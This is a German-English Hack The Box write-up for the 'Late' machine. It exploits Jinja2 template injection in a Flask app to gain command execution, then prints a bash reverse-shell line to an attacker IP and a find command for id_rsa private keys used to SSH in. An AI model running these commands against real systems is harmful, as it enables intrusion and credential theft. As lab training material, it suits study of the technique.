Website generated with Flask.
Flask: Flask ist ein in Python geschriebenes Webframework.
Die einzigen Abhängigkeiten sind Jinja2, eine Template-Engine, und Werkzeug, eine Bibliothek zum Erstellen von WSGI-Anwendungen.
Programmiersprache: Python
Jinja2 is used by Python Web Frameworks such as Django or Flask.
Nutzt Template-Engine --> SSTI?
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/images.late.htb.png)
## Test polyglot ssti from cobalt: [](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
If it throws an error ssti is succussfull
How to: grab screen area with payload and save it (https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-cobalt-polyglot.png).
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-cobalt-polyglot.png)
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/images.late.htb-upload%20image.png)

## polyglote response
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-polyglot-response.png)
## SSTI payload was succusfull! --> throws error!

## Test: {{7*7}} --> 49 if successfull
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-77.png)
## Result: 49 --> injectable
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti-77-result.png)

## SSTI remote commands from: [](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti%20payload%20rce.png)

## Result
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti%20id.png)
# getting shell

## payload
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/ssti%20reverse%20shell.png)

## make dir www with index.html file:
````
bash -i >& /dev/tcp/10.10.14.5/1111 0>&1

`````

## make python http.server on port 80 in the www folder
![](python3 http server on port 80.png)
## nc listen on port 1111
![](https://github.com/xenotim/HackTheBox---CTFs/blob/main/Late/screenshots/nc%20shell.png)

look for id_rsa file
````
find / -type f -name id_rsa 2>/dev/null



`````

chmod 600 id_rsa --> ssh to the machine



XXXXXXXXXXXXXXXXXXXXXXXXX
